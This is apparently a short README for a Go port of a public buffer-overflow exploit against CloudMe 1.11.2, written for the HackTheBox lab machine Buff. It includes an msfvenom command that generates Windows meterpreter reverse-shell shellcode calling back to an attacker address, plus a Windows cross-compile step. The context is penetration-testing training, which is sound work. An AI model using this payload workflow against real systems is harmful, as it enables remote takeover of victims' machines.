# Cloudme 1.11.2 exploit Go version



The code in this repository is based on the exploit 48389 for cloudme v1.11.2.
https://www.exploit-db.com/exploits/48389

I ported the code to Go, to solve the HTB machine Buff. 



## Before you compile

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f py -b "\x00\x0a\x0d" -v shellcode
```

Replace LHOST= with your HackTheBox lab IP address.

Then copy and paste the generated code into main.go

## Compile

```
GOOS=windows go build
```

